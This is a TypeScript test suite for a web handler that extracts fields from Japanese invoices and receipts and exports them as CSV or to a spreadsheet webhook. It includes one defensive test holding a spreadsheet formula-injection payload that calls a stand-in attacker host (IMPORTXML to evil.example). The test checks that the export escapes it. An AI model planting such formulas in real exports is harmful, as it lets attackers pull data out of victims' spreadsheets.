import { describe, expect, it } from "vitest";
import { reply, scriptedClient } from "../../test/scripted-client";
import { resolveConfig } from "./config";
import { sha256Hex } from "./document";
import { createFakeClient } from "./fake-client";
import { parseForm } from "./forms";
import { createReader, HANDLER_MESSAGES, MAX_BODY_BYTES, routeOf, sheetRows, tokenEquals } from "./handler";
import { createLogRing } from "./log";
import type { ExtractResult, ReaderConfig } from "./types";

const forms = new Map([
  ["invoice", parseForm({ id: "invoice", name: "請求書", fields: [
    { key: "issuer", label: "請求元", type: "string", required: true },
    { key: "invoiceNumber", label: "請求書番号", type: "string" },
    { key: "total", label: "合計金額", type: "money", required: true },
    { key: "lineItems", label: "明細", type: "table", columns: [{ key: "description", label: "品名", type: "string" }, { key: "amount", label: "金額", type: "money" }] },
  ] })],
  ["receipt", parseForm({ id: "receipt", name: "領収書", fields: [{ key: "issuer", label: "発行者", type: "string" }, { key: "total", label: "合計金額", type: "money" }] })],
]);
const pdfBytes = Uint8Array.from([...Array.from("%PDF-1.4 << /Type /Page >>", (c) => c.charCodeAt(0))]);
const goodJson = JSON.stringify({
  fields: { issuer: { value: "さくら設備", confidence: 0.95, evidence: "さくら設備" }, invoiceNumber: { value: "INV-1", confidence: 0.9, evidence: "" }, total: { value: "11,000", confidence: 0.99, evidence: "" } },
  tables: { lineItems: { rows: [{ description: "工事", amount: "11,000" }], confidence: 0.9 } },
  notes: "",
});
const BASE = "https://reader.example/api/reader";
const config = (over: Partial<ReaderConfig> = {}): ReaderConfig => ({ ...resolveConfig({ env: { ANTHROPIC_API_KEY: "k" } }), ...over });

function multipart(file: Uint8Array | null, extra: Record<string, string> = {}, name = "a.pdf"): Request {
  const body = new FormData();
  // DEVIATION: TS 5.9 は Uint8Array を Uint8Array<ArrayBufferLike> に広げるため BlobPart と合わず、最小限のキャストで通す
  if (file !== null) body.set("file", new File([file as unknown as BlobPart], name, { type: "application/octet-stream" }));
  for (const [k, v] of Object.entries(extra)) body.set(k, v);
  return new Request(`${BASE}/extract`, { method: "POST", body, headers: { origin: "https://reader.example" } });
}
const json = (path: string, body: unknown, headers: Record<string, string> = {}): Request =>
  new Request(`${BASE}${path}`, { method: "POST", body: JSON.stringify(body), headers: { "content-type": "application/json", origin: "https://reader.example", ...headers } });

describe("routeOf", () => {
  it("末尾で見分ける", () => {
    expect(routeOf(new URL(`${BASE}/extract`))).toBe("extract");
    expect(routeOf(new URL(`${BASE}/forms`))).toBe("forms");
    expect(routeOf(new URL(`${BASE}/config`))).toBe("config");
    expect(routeOf(new URL(`${BASE}/csv`))).toBe("csv");
    expect(routeOf(new URL(`${BASE}/send`))).toBe("send");
    expect(routeOf(new URL(`${BASE}/health`))).toBe("health");
    expect(routeOf(new URL(`${BASE}/admin`))).toBe("admin");
    expect(routeOf(new URL(`${BASE}/other`))).toBe("none");
  });
});

describe("POST /extract", () => {
  it("multipart の書類を読み取り、結果を返す（記録つき）", async () => {
    const { client, calls } = scriptedClient([reply(goodJson)]);
    const log = createLogRing();
    const reader = createReader(config(), { forms, client, log });
    const res = await reader.fetch(multipart(pdfBytes, { form: "invoice" }));
    expect(res.status).toBe(200);
    const body = (await res.json()) as ExtractResult;
    expect(body.ok).toBe(true);
    expect(body.form).toBe("invoice");
    expect(body.fileName).toBe("a.pdf");
    expect(body.fields.total.value).toBe(11000);
    expect(body.documentId).toBe(await sha256Hex(pdfBytes));
    expect(calls[0].system[0].text).toContain("請求書");
    expect(log.size()).toBe(1);
    expect(log.list()[0]).toMatchObject({ ok: true, form: "invoice", needsReview: false });
    expect(res.headers.get("cache-control")).toBe("no-store");
  });

  it("JSON（base64）でも受ける。form を省くと既定の型", async () => {
    const { client } = scriptedClient([reply(goodJson)]);
    const reader = createReader(config(), { forms, client });
    const data = Buffer.from(pdfBytes).toString("base64");
    const res = await reader.fetch(json("/extract", { fileName: "b.pdf", data }));
    expect(res.status).toBe(200);
    expect(((await res.json()) as ExtractResult).form).toBe("invoice");
  });

  it("自由項目（fields）で読める", async () => {
    const answer = JSON.stringify({ fields: { f1: { value: "みなと商会", confidence: 0.9, evidence: "" } }, tables: {}, notes: "" });
    const { client, calls } = scriptedClient([reply(answer)]);
    const reader = createReader(config(), { forms, client });
    const res = await reader.fetch(multipart(pdfBytes, { fields: JSON.stringify([{ label: "工事名" }]) }));
    expect(res.status).toBe(200);
    expect(((await res.json()) as ExtractResult).fields.f1.value).toBe("みなと商会");
    expect(calls[0].system[0].text).toContain("工事名");
  });

  it("ファイル無し・知らない型・壊れた JSON・壊れた自由項目は 400", async () => {
    const reader = createReader(config(), { forms, client: scriptedClient([]).client });
    expect((await reader.fetch(multipart(null))).status).toBe(400);
    expect((await reader.fetch(multipart(pdfBytes, { form: "nope" }))).status).toBe(400);
    expect((await reader.fetch(new Request(`${BASE}/extract`, { method: "POST", body: "{", headers: { "content-type": "application/json" } }))).status).toBe(400);
    const bad = await reader.fetch(multipart(pdfBytes, { fields: "[]" }));
    expect(bad.status).toBe(400);
    expect(((await bad.json()) as { message: string }).message).toContain("項目");
  });

  it("種類が合わない書類は 415、大きすぎは 413（content-length でも実測でも）、ページが多すぎも 413", async () => {
    const reader = createReader(config({ limits: { ...resolveConfig().limits, maxFileBytes: 64, maxPages: 1 } }), { forms, client: scriptedClient([]).client });
    expect((await reader.fetch(multipart(Uint8Array.from([1, 2, 3])))).status).toBe(415);
    expect((await reader.fetch(multipart(new Uint8Array(100).fill(0x25)))).status).toBe(413);
    const big = new Request(`${BASE}/extract`, { method: "POST", body: "x", headers: { "content-length": String(MAX_BODY_BYTES + 1), "content-type": "application/json" } });
    expect((await reader.fetch(big)).status).toBe(413);
    const twoPages = Uint8Array.from(Array.from("%PDF-1.4 /Type /Page /Type /Page", (c) => c.charCodeAt(0)));
    const res = await reader.fetch(multipart(twoPages));
    expect(res.status).toBe(413);
    expect(((await res.json()) as { code: string }).code).toBe("too_many_pages");
  });

  it("別のオリジンは 403、許可したオリジンには CORS の頭が付く", async () => {
    const reader = createReader(config({ allowedOrigins: ["https://ok.example"] }), { forms, client: scriptedClient([reply(goodJson)]).client });
    const bad = multipart(pdfBytes);
    bad.headers.set("origin", "https://evil.example");
    expect((await reader.fetch(new Request(bad, { headers: { origin: "https://evil.example" } }))).status).toBe(403);
    const body = new FormData();
    body.set("file", new File([pdfBytes], "a.pdf"));
    const okReq = new Request(`${BASE}/extract`, { method: "POST", body, headers: { origin: "https://ok.example" } });
    const res = await reader.fetch(okReq);
    expect(res.status).toBe(200);
    expect(res.headers.get("access-control-allow-origin")).toBe("https://ok.example");
  });

  it("回数の上限は 429、日次の上限も 429", async () => {
    const limits = { ...resolveConfig().limits, perMinute: 1, perHour: 10, daily: 10 };
    const reader = createReader(config({ limits }), { forms, client: createFakeClient(new Map()), now: () => 1_000_000 });
    expect((await reader.fetch(multipart(pdfBytes))).status).toBe(200);
    expect((await reader.fetch(multipart(pdfBytes))).status).toBe(429);
    const daily = createReader(config({ limits: { ...limits, perMinute: 10, daily: 1 } }), { forms, client: createFakeClient(new Map()), now: () => 1_000_000 });
    await daily.fetch(multipart(pdfBytes));
    const res = await daily.fetch(multipart(pdfBytes));
    expect(res.status).toBe(429);
    expect(((await res.json()) as { code: string }).code).toBe("daily_limit");
  });

  it("上限に達した求めは、書類を調べる前に断る", async () => {
    const limits = { ...resolveConfig().limits, perMinute: 1 };
    const reader = createReader(config({ limits }), { forms, client: createFakeClient(new Map()), now: () => 1_000_000 });
    expect((await reader.fetch(multipart(pdfBytes))).status).toBe(200);
    // 中身の種類が分からないファイル。書類を調べていれば 415 だが、先に回数の枠を見るので 429
    const unknown = Uint8Array.from(Array.from("plain text", (c) => c.charCodeAt(0)));
    const res = await reader.fetch(multipart(unknown, {}, "a.txt"));
    expect(res.status).toBe(429);
    expect(((await res.json()) as { code: string }).code).toBe("rate_limited");
  });

  it("鍵が無ければ 503 で、記録は残す", async () => {
    const log = createLogRing();
    const reader = createReader(resolveConfig(), { forms, log });
    const res = await reader.fetch(multipart(pdfBytes));
    expect(res.status).toBe(503);
    expect(((await res.json()) as { message: string }).message).toBe(HANDLER_MESSAGES.unavailable);
    expect(log.list()[0]).toMatchObject({ ok: false, code: "unavailable", reason: "no_key" });
  });

  it("鍵が違うとき、お客さまには 503 の同じ文面。記録には auth と残る", async () => {
    const log = createLogRing();
    const unauthorized = Object.assign(new Error("invalid x-api-key"), { status: 401 });
    const reader = createReader(config(), { forms, client: scriptedClient([unauthorized]).client, log });
    const res = await reader.fetch(multipart(pdfBytes));
    expect(res.status).toBe(503);
    const body = (await res.json()) as Record<string, unknown>;
    expect(body.message).toBe(HANDLER_MESSAGES.unavailable);
    expect(body.reason).toBeUndefined();
    expect(log.list()[0]).toMatchObject({ ok: false, code: "unavailable", reason: "auth" });
  });

  it("読めなかった・断られたは 422、API の失敗は 503", async () => {
    const reader = createReader(config(), { forms, client: scriptedClient([reply("x"), reply("y"), reply("", { stop_reason: "refusal", content: [] }), new Error("down")]).client });
    expect((await reader.fetch(multipart(pdfBytes))).status).toBe(422);
    expect((await reader.fetch(multipart(pdfBytes))).status).toBe(422);
    expect((await reader.fetch(multipart(pdfBytes))).status).toBe(503);
  });

  it("ページ数を数えられない PDF は通すが pages_unknown の警告が付く（記録の pages は null）", async () => {
    const log = createLogRing();
    const reader = createReader(config(), { forms, client: scriptedClient([reply(goodJson)]).client, log });
    // /Type /Page も /Count も持たない PDF（本来は圧縮されたオブジェクトストリームの中にある）
    const modern = Uint8Array.from(Array.from("%PDF-1.7\n1 0 obj\n<</Type/Catalog>>\n%%EOF", (c) => c.charCodeAt(0)));
    const res = await reader.fetch(multipart(modern));
    expect(res.status).toBe(200);
    const body = (await res.json()) as ExtractResult;
    expect(body.pages).toBeNull();
    expect(body.needsReview).toBe(true);
    expect(body.warnings.map((w) => w.code)).toContain("pages_unknown");
    expect(log.list()[0]).toMatchObject({ ok: true, pages: null });
  });

  it("同じ書類を 2 度読むと duplicate の警告が付き、要確認になる", async () => {
    const reader = createReader(config(), { forms, client: scriptedClient([reply(goodJson), reply(goodJson)]).client });
    await reader.fetch(multipart(pdfBytes));
    const second = (await (await reader.fetch(multipart(pdfBytes))).json()) as ExtractResult;
    expect(second.needsReview).toBe(true);
    expect(second.warnings.map((w) => w.code)).toContain("duplicate");
  });

  it("READER_FAKE=1 なら鍵が無くても偽の答えで動く", async () => {
    const reader = createReader(resolveConfig({ env: { READER_FAKE: "1" } }), { forms });
    const res = await reader.fetch(multipart(pdfBytes));
    expect(res.status).toBe(200);
    expect(((await res.json()) as ExtractResult).notes).toContain("見本");
  });

  it("OPTIONS は 204、GET は 405", async () => {
    const reader = createReader(config(), { forms });
    expect((await reader.fetch(new Request(`${BASE}/extract`, { method: "OPTIONS" }))).status).toBe(204);
    expect((await reader.fetch(new Request(`${BASE}/extract`))).status).toBe(405);
  });
});

describe("GET /forms /config /health", () => {
  it("型の一覧・画面の設定・生存確認", async () => {
    const reader = createReader(config({ sendWebhookUrl: "https://s.example", sendToken: "t" }), { forms });
    const f = (await (await reader.fetch(new Request(`${BASE}/forms`))).json()) as { ok: boolean; forms: Array<{ id: string; fields: unknown[] }>; defaultForm: string };
    expect(f.forms.map((x) => x.id)).toEqual(["invoice", "receipt"]);
    expect(f.defaultForm).toBe("invoice");
    const c = (await (await reader.fetch(new Request(`${BASE}/config`))).json()) as Record<string, unknown>;
    expect(Object.keys(c).sort()).toEqual(["canSend", "defaultForm", "labels", "limits", "ok", "site"]);
    expect(c.canSend).toBe(true);
    expect(JSON.stringify(c)).not.toContain("https://s.example");
    const h = (await (await reader.fetch(new Request(`${BASE}/health`))).json()) as Record<string, unknown>;
    expect(h).toEqual({ ok: true, forms: 2, model: "claude-opus-5", hasKey: true, fake: false });
  });
});

describe("POST /csv と /send", () => {
  const result: ExtractResult = {
    ok: true, documentId: "d1", form: "invoice", fileName: "a.pdf", pages: 1,
    fields: { issuer: { value: "さくら設備", confidence: 1, evidence: "" }, invoiceNumber: { value: "INV-1", confidence: 1, evidence: "" }, total: { value: 11000, confidence: 1, evidence: "" } },
    tables: { lineItems: { rows: [{ description: "工事", amount: 11000 }], confidence: 1 } },
    warnings: [], needsReview: false, notes: "", usage: { inputTokens: 0, outputTokens: 0, cacheReadTokens: 0, cacheCreationTokens: 0 }, ms: 0,
  };

  it("/csv は BOM つきの CSV。table を付ければ明細の CSV", async () => {
    const reader = createReader(config(), { forms });
    const res = await reader.fetch(json("/csv", { form: "invoice", results: [result] }));
    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toBe("text/csv; charset=utf-8");
    expect(res.headers.get("content-disposition")).toBe('attachment; filename="invoice.csv"');
    // DEVIATION: Response#text() は WHATWG の仕様どおり先頭の UTF-8 BOM を取り除いてしまうため、
    // 生のバイト列を ignoreBOM で読み直して確かめる（実際に送られるバイト列には BOM が残る）。
    const text = new TextDecoder("utf-8", { ignoreBOM: true }).decode(await res.arrayBuffer());
    expect(text.charCodeAt(0)).toBe(0xfeff);
    expect(text).toContain("請求元,請求書番号,合計金額");
    const lines = await reader.fetch(json("/csv", { form: "invoice", results: [result], table: "lineItems" }));
    expect(lines.headers.get("content-disposition")).toBe('attachment; filename="invoice-lineItems.csv"');
    expect(await lines.text()).toContain("行,品名,金額");
  });

  it("/csv の壊れた本文・知らない型は 400", async () => {
    const reader = createReader(config(), { forms });
    expect((await reader.fetch(json("/csv", { form: "nope", results: [] }))).status).toBe(400);
    expect((await reader.fetch(json("/csv", { form: "invoice", results: "x" }))).status).toBe(400);
    expect((await reader.fetch(json("/csv", { form: "invoice", results: [result], table: "nope" }))).status).toBe(400);
    expect((await reader.fetch(json("/csv", { form: "invoice", results: [result], table: "x\r\ny" }))).status).toBe(400);
  });

  it("sheetRows は見出しと行（真偽は はい／いいえ、null は空）", () => {
    const out = sheetRows(forms.get("invoice")!, [result]);
    expect(out.headers).toEqual(["書類ID", "ファイル名", "請求元", "請求書番号", "合計金額"]);
    expect(out.rows).toEqual([["d1", "a.pdf", "さくら設備", "INV-1", 11000]]);
  });

  it("sheetRows も数式の頭文字を守る（受け口を差し替えても効くように）", () => {
    const evil: ExtractResult = { ...result, fields: { ...result.fields, issuer: { value: '=IMPORTXML("https://evil.example","//x")', confidence: 1, evidence: "" } } };
    const out = sheetRows(forms.get("invoice")!, [evil]);
    expect(out.rows[0][2]).toBe('\'=IMPORTXML("https://evil.example","//x")');
  });

  it("/csv と /send はほかのサイトからの求めを断る（403）", async () => {
    const reader = createReader(config({ sendWebhookUrl: "https://s.example", sendToken: "t" }), { forms });
    const foreign = { origin: "https://evil.example" };
    expect((await reader.fetch(json("/csv", { form: "invoice", results: [result] }, foreign))).status).toBe(403);
    expect((await reader.fetch(json("/send", { form: "invoice", results: [result] }, foreign))).status).toBe(403);
  });

  it("/csv と /send は JSON 以外の content-type を断る（400）", async () => {
    const reader = createReader(config({ sendWebhookUrl: "https://s.example", sendToken: "t" }), { forms });
    const plain = { "content-type": "text/plain;charset=UTF-8" };
    expect((await reader.fetch(json("/csv", { form: "invoice", results: [result] }, plain))).status).toBe(400);
    const res = await reader.fetch(json("/send", { form: "invoice", results: [result] }, plain));
    expect(res.status).toBe(400);
    expect(((await res.json()) as { message: string }).message).toBe(HANDLER_MESSAGES.badRequest);
  });

  it("body.form と違う型で読んだ結果が混ざっていれば 400", async () => {
    const reader = createReader(config({ sendWebhookUrl: "https://s.example", sendToken: "t" }), { forms });
    expect((await reader.fetch(json("/csv", { form: "receipt", results: [result] }))).status).toBe(400);
    expect((await reader.fetch(json("/send", { form: "receipt", results: [result] }))).status).toBe(400);
    // 同じ型だけなら通る
    expect((await reader.fetch(json("/csv", { form: "invoice", results: [result] }))).status).toBe(200);
  });

  it("/send は受け口へ token・sheet・headers・rows を送り、appended を返す", async () => {
    const seen: Array<{ url: string; body: unknown }> = [];
    const fetchImpl = (async (url: string | URL | Request, init?: RequestInit) => {
      seen.push({ url: String(url), body: JSON.parse(String(init?.body)) });
      return new Response(JSON.stringify({ ok: true, appended: 1 }), { status: 200, headers: { "content-type": "application/json" } });
    }) as unknown as typeof fetch;
    const reader = createReader(config({ sendWebhookUrl: "https://script.google.com/x/exec", sendToken: "tok", send: { sheet: "請求書" } }), { forms, fetch: fetchImpl });
    const res = await reader.fetch(json("/send", { form: "invoice", results: [result] }));
    expect(res.status).toBe(200);
    expect(await res.json()).toEqual({ ok: true, appended: 1 });
    expect(seen[0].url).toBe("https://script.google.com/x/exec");
    expect(seen[0].body).toEqual({ token: "tok", sheet: "請求書", headers: ["書類ID", "ファイル名", "請求元", "請求書番号", "合計金額"], rows: [["d1", "a.pdf", "さくら設備", "INV-1", 11000]] });
  });

  it("/send は送り先が無ければ 400、受け口が失敗すれば 502、51 件以上は 400", async () => {
    const none = createReader(config(), { forms });
    expect((await none.fetch(json("/send", { form: "invoice", results: [result] }))).status).toBe(400);
    const failing = (async () => new Response("no", { status: 500 })) as unknown as typeof fetch;
    const reader = createReader(config({ sendWebhookUrl: "https://s.example", sendToken: "t" }), { forms, fetch: failing });
    expect((await reader.fetch(json("/send", { form: "invoice", results: [result] }))).status).toBe(502);
    expect((await reader.fetch(json("/send", { form: "invoice", results: Array(51).fill(result) }))).status).toBe(400);
  });
});

describe("GET /admin", () => {
  it("合い言葉なしは 404、合えば HTML", async () => {
    const reader = createReader(config({ adminToken: "secret" }), { forms });
    expect((await reader.fetch(new Request(`${BASE}/admin`))).status).toBe(404);
    expect((await reader.fetch(new Request(`${BASE}/admin?token=wrong`))).status).toBe(404);
    const res = await reader.fetch(new Request(`${BASE}/admin?token=secret`));
    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toBe("text/html; charset=utf-8");
    expect(await res.text()).toContain("読み取りの記録");
    expect((await createReader(config(), { forms }).fetch(new Request(`${BASE}/admin?token=x`))).status).toBe(404);
  });

  it("Authorization: Bearer でも通る。合い言葉の比べ方は長さと中身の両方を見る", async () => {
    const reader = createReader(config({ adminToken: "secret" }), { forms });
    const res = await reader.fetch(new Request(`${BASE}/admin`, { headers: { authorization: "Bearer secret" } }));
    expect(res.status).toBe(200);
    expect((await reader.fetch(new Request(`${BASE}/admin`, { headers: { authorization: "Bearer secre" } }))).status).toBe(404);
    expect(tokenEquals("secret", "secret")).toBe(true);
    expect(tokenEquals("secrex", "secret")).toBe(false);
    expect(tokenEquals("secre", "secret")).toBe(false);
    expect(tokenEquals("", "")).toBe(true);
  });
});

describe("その他", () => {
  it("知らない道は 404 の JSON", async () => {
    const reader = createReader(config(), { forms });
    const res = await reader.fetch(new Request(`${BASE}/nope`));
    expect(res.status).toBe(404);
    expect(((await res.json()) as { ok: boolean }).ok).toBe(false);
  });
});
